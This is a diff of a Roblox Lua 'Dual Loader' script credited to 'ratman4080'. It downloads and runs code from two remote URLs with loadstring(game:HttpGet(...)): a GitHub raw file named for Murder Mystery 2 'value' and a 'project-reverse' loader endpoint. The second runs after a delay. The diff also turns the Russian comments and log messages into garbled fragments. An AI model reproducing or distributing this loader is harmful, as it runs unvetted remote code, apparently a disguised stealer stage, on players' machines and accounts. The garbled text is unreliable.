@@ -1,34 +1,31 @@
--- ratman4080 | Dual Loader
--- Сначала первый скрипт, через 5 минут — второй
-
--- ========== СЮДА ВСТАВЬ ПЕРВЫЙ СКРИПТ ==========
+-- ========== С ==========
 local Script1 = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/spotyfyy6t-spec/mm2value/refs/heads/main/MM2valueINmm2"))()]]
 
--- ========== СЮДА ВСТАВЬ ВТОРОЙ СКРИПТ ==========
+-- ========== С ==========
 local Script2 = [[loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjQ2NzUyOTgwLTUzNmMtNGY3Yi05ZWFjLTgxZDExMWRlMmU0MCIsImtpbmQiOiJsb2FkZXIifQ"))()]]
 
--- ========== ЗАПУСК ==========
-print("[ratman4080] Запускаю Script 1...")
+-- ========== З ==========
+print("[r] Зю Script 1...")
 local ok1, err1 = pcall(function()
     loadstring(Script1)()
 end)
 if not ok1 then
-    warn("[ratman4080] Script 1 error:", err1)
+    warn("[r80] Script 1 error:", err1)
 else
-    print("[ratman4080] Script 1 OK")
+    print("[ra] Script 1 OK")
 end
 
-print("[ratman4080] Жду 5 минут (300 сек) до Script 2...")
-task.wait(500) -- 5 минут
+print("[r0] у 5 т (3) до Script 2...")
+task.wait(500) -- 5 т
 
-print("[ratman4080] Запускаю Script 2...")
+print("[r0] ю Script 2...")
 local ok2, err2 = pcall(function()
     loadstring(Script2)()
 end)
 if not ok2 then
-    warn("[ratman4080] Script 2 error:", err2)
+    warn("[r0] Script 2 error:", err2)
 else
-    print("[ratman4080] Script 2 OK")
+    print("[ra0] Script 2 OK")
 end
 
-print("[ratman4080] Оба скрипта отработали.")
+print("[r0] ЛАРИСОВ КРАШ.")
